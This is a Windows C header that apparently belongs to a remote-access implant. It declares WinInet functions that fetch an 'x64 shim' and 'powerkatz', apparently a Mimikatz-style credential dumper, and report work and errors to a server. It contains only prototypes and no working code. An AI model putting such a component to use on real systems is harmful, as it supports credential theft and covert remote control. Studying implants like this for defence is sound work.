#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Winsock2.h>
#include <Windows.h>
#include <WinInet.h>

#pragma comment(lib, "Wininet.lib")

#include "proton_types.h"

BOOL proton_http_request(LPCSTR host, WORD port, BOOL secure, LPCSTR verb, LPCSTR path, LPCSTR szHeaders, SIZE_T nHeaderSize,
	LPCSTR postData, SIZE_T nPostDataSize, char **data, LPDWORD dwDataSize);

BOOL proton_http_get_x64_shim(proton_shim_parsed *parsed, char **data, LPDWORD dwSize);
BOOL proton_http_get_powerkatz(proton_shim_parsed *parsed, char **data, LPDWORD dwSize);

BOOL proton_http_report_work(proton_shim_parsed *parsed, char *work);
BOOL proton_http_report_error(proton_shim_parsed *parsed, char *work);